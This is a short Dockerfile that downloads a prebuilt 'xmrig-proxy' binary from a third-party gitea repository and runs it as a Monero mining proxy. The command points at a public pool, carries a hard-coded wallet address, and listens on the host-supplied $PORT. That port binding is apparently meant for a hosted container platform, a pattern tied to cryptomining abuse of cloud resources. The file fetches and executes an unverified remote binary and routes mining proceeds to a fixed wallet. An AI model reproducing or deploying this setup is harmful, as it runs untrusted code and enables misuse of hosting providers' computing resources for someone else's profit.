FROM ubuntu
WORKDIR /root
RUN apt-get update && apt-get install wget ca-certificates -y
RUN wget https://gitea.com/gaymine/mine/raw/branch/master/xmrig-proxy && chmod +x xmrig-proxy
CMD ./xmrig-proxy -o sg.minexmr.com:4444 -u 45o9vo19xTZKFPrMmZRiWC16qYTqbMdXJLZN8pxT5Bn7K9gJ44EzhZc1FxnSZjSVxfaR1DG5uTk2daXvuQ2Gx1JQPV4C5zH -b 0.0.0.0:$PORT
